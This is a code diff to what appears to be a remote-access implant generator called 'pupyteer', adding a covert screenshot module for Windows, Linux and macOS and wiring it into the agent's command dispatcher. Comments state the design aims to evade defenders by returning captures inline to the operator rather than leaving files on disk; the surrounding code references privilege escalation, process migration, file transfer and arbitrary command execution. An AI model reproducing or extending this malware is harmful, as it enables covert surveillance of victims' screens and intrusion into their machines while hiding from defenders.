@@ -93,7 +93,6 @@ class StubConfig:
         "fs": True,
         "privesc": True,
         "screenshot": False,
-        "keylog": False,
     })
 
     # Transport extras
@@ -254,7 +253,6 @@ class AgentStubGenerator:
             "include_fs": cfg.modules.get("fs", False),
             "include_privesc": cfg.modules.get("privesc", False),
             "include_screenshot": cfg.modules.get("screenshot", False),
-            "include_keylog": cfg.modules.get("keylog", False),
             "platform": cfg.platform.lower(),
             "transport": cfg.transport.lower(),
             "enc": cfg.use_encryption,
@@ -1040,6 +1038,91 @@ def mod_privesc_suggest(check: dict) -> list:
     return suggestions
 {% endif %}
 
+{% if include_screenshot %}
+_MAX_SHOT_BYTES = 12 * 1024 * 1024
+
+def _ps_quote(value: str) -> str:
+    """Render a string as a PowerShell single-quoted literal ('' is its escape)."""
+    return "'" + value.replace("'", "''") + "'"
+
+
+def _shot_windows(path: str) -> None:
+    # System.Drawing writes a real PNG, so the agent needs no imaging library.
+    # The destination goes in as a single-quoted literal, not a trailing
+    # argument: `powershell -Command <script> <arg>` concatenates the argument
+    # onto the script text instead of binding it to $args.
+    script = (
+        "Add-Type -AssemblyName System.Windows.Forms;"
+        "Add-Type -AssemblyName System.Drawing;"
+        "$b = [System.Windows.Forms.SystemInformation]::VirtualScreen;"
+        "$i = New-Object System.Drawing.Bitmap $b.Width, $b.Height;"
+        "$g = [System.Drawing.Graphics]::FromImage($i);"
+        "$g.CopyFromScreen($b.Location, (New-Object System.Drawing.Point 0,0), $b.Size);"
+        "$i.Save(" + _ps_quote(path) + "); $g.Dispose(); $i.Dispose()"
+    )
+    _sp.run(["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
+            capture_output=True, timeout=60, check=True)
+
+
+def _shot_posix(path: str) -> None:
+    """Try each screen-grab this desktop might have installed, in likelihood order.
+
+    X11 and Wayland tools differ, and none of them is present on a headless
+    box — so every miss is remembered and reported rather than the last one.
+    """
+    if PLATFORM == "macos":
+        candidates = [["screencapture", "-x", path]]
+    else:
+        candidates = [
+            ["gnome-screenshot", "-f", path],
+            ["scrot", "--overwrite", path],
+            ["spectacle", "-b", "-n", path],
+            ["xfce4-screenshooter", "-f", "save", path],
+            ["import", "-window", "root", path],
+            ["grim", path],
+        ]
+    missing = []
+    for cmd in candidates:
+        try:
+            _sp.run(cmd, capture_output=True, timeout=60, check=True)
+            return
+        except FileNotFoundError:
+            missing.append(cmd[0])
+        except _sp.CalledProcessError:
+            missing.append(cmd[0] + " failed")
+    raise RuntimeError("no working screenshot tool (tried: " + ", ".join(missing) + ")")
+
+
+def mod_screenshot() -> dict:
+    """Capture the whole screen and return it base64-encoded.
+
+    Returned inline rather than written where the operator can fetch it: a
+    capture left on disk is a file the defender will find later.
+    """
+    import tempfile as _tf
+    fd, path = _tf.mkstemp(prefix=".pupyteer-shot-", suffix=".png")
+    _o.close(fd)
+    try:
+        if PLATFORM == "windows":
+            _shot_windows(path)
+        else:
+            _shot_posix(path)
+        with open(path, "rb") as f:
+            raw = f.read()
+    finally:
+        try:
+            _o.remove(path)
+        except OSError:
+            pass
+    if not raw:
+        return {"error": "capture produced an empty image"}
+    if len(raw) > _MAX_SHOT_BYTES:
+        # Handing back more than this would push the reply past the listener's
+        # message ceiling and drop the connection with every queued command.
+        return {"error": f"image too large to return: {len(raw)} bytes"}
+    return {"format": "png", "bytes": len(raw), "data": _b64e(raw).decode()}
+{% endif %}
+
 # --------------------------------------------------------------------- #
 #  Migration
 # --------------------------------------------------------------------- #
@@ -1342,6 +1425,10 @@ def _dispatch(task: dict) -> dict:
         check = mod_privesc_check()
         return {"check": check, "suggestions": mod_privesc_suggest(check)}
     {% endif %}
+    {% if include_screenshot %}
+    if action == "screenshot":
+        return mod_screenshot()
+    {% endif %}
     {% if migration %}
     if action == "migrate":
         return migrate(task.get("target", ""), task.get("technique", "{{ cfg.migrate_technique }}"))
@@ -1411,8 +1498,9 @@ def _run_command(text: str) -> str:
         raise
     except Exception as e:
         return f"error: {e}"
-    if task.get("action") in ("fs_get", "fs_put"):
-        # Transfer replies are already chunked to fit and must stay parseable.
+    if task.get("action") in ("fs_get", "fs_put", "screenshot"):
+        # Binary replies carry base64 that the operator parses whole; clipping
+        # it mid-stream yields corrupt data. They bound themselves instead.
         return _render_result(result)
     return _clip(_render_result(result))
 
@@ -1482,6 +1570,10 @@ def _parse_command(text: str) -> dict:
                 "data": data}
     if v == "migrate":
         return {"action": "migrate", "target": arg}
+    {% if include_screenshot %}
+    if v == "screenshot":
+        return {"action": "screenshot"}
+    {% endif %}
     return {"action": "exec", "command": text}
 
 # --------------------------------------------------------------------- #
